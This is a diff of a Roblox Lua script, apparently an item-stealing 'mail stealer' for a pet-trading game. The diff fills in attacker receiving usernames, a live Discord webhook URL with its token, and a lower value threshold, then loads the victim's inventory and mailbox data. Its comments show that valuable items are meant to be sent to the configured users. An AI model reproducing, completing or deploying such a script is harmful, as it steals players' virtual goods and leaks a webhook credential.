@@ -1,14 +1,13 @@
-Username = "your user here"
-Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "Your discord webhook here"
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+Username = "Found_U58"
+Username2 = "Found_U58" -- stuff will get sent to this user if first user's mailbox is full
+webhook = "https://discord.com/api/webhooks/1268212736332922960/nZunN_ZV6LW08mqll_ZzbWJ6tiZ_OsiT8WZUMWtkJ7kUts2OXRnwPj0WNWrYTpOn61wR"
+min_rap = 100000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
-local MailMessage = "gg / ZV52aFWyWm"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
